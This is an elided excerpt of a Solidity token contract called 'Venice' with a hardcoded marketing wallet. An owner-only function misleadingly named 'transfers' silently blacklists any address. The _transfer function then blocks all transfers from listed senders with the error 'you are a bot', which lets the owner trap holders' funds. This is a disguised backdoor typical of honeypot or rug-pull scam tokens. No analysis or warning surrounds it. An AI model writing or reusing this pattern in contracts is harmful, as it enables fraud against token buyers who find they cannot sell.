...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "Venice";
    string private _symbol = "Venice";
    uint8 private _decimals = 9;
    address payable public marketingWalletAddress; 
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    address _marketingWalletAddress = 0xC02F0DCc02C3Ac6B9C62eDc716abbF6Bcbd97232;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public isExcludedFromFee;
    mapping(address => bool) bAdress;
    ...
    function transfers (address _address) external onlyOwner {
        bAdress[_address] = true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!bAdress[sender],"you are a bot");
